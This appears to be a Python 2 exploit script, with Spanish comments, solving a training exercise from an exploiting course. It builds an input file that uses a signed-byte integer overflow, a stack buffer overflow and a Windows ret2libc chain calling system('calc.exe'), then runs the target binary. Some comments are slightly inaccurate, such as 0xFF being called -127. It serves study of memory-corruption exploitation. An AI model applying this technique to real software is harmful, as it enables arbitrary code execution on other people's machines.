# http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/015%20stack12.idb/
#Solucion explotando Integer Overflow
import struct
import subprocess
#El binario lee el archivo fichero.dat
f = open("./fichero.dat", "w")
#lee los primeros 4 bytes 
#lee los segundos 4 bytes y los pone en var_8 desde 1 a 4
#lee los terceros 4 bytes y los pone en var_10 desde 1 a 4
#lee el primer byte del los terceros y lo pone en var_1
#compara var_14 (0x32) con el valor de var_1 (situado ahora en ecx)
firstPart  = struct.pack("<I", 0x47441322) # Cookie1
secondPart = struct.pack("<I", 0x11111111) # Cookie2

#Bueno... me dijeron que Hijackear la libreria no es valido asi que me fui por el camino del integer overflow que afecta al if.
#if var_1 > 0x32 
#Integer overflow!!!
#Si en ves de pasar 0x00000032 para que esto sucesa envio, 0x01010132 el 01 delante del 32 le indica que es un valor negativo -0x32 es menor a 0x32 y pasa el if
#Entonces puedo hacer enviar 01FF donde -0xFF es menor a 0x32
#El truco aca es que fread llamado mas adelante interpreta los enteros como unsigned para poder leer, ej -0xFF lo interpretara como 0xFF permitiendo leer 255 bytes del fichero.dat
byteZero = "\xFF" # FF es en BINARIO 11111111111 al tener en BINARIO el primer numero en 1 impacta en el hexa volviendolo un valor negativo -0xFF => -127

#Luego llega la funcion check donde toma arg_0 y arg_4 (firstPart, SecondPart respectivamente)
#Suma arg_0 y arg_4 y comparar el resultado con con 58552433 (XU$3) debemos cumplir la condicion para que cargue la libreria pepe.dll

#Completo el fichero con la data necesaria para colocar las direcciones de memoria y nuestro texto en una direccion con permisos de escritura
junk = "A" * 42
calc = "calc.exe      " # Pequenio truquito de espacios para colocar donde quiero el texto
memcpy_dest = struct.pack('<I', 0x10103024) # => Puntero a una direccion de memoria escribible donde quiero meter junk + calc
junk2 = "B" * 28 # => Basura para llegar a la base de EIP

#Hacemos el ret2libc de toda la vida pero en windows
#Desde la libreria pepe.dll sacamos la direccion de system()
system = struct.pack("<I", 0x78019824) # => Dentro de pepe.dll
exit = struct.pack("<I", 0x10101D78) # => Direccion de Exit
p_calc = struct.pack("<I", 0x1010304E) # => Direccion de la variable calc luego de copiarla con memcpy

ret2system = system + exit + p_calc
payload = firstPart + secondPart + byteZero + junk + calc + memcpy_dest + junk2 + ret2system
f.write(payload)
f.close()
print "[#] Sending Payload"
subprocess.call(["stack9b.exe"])
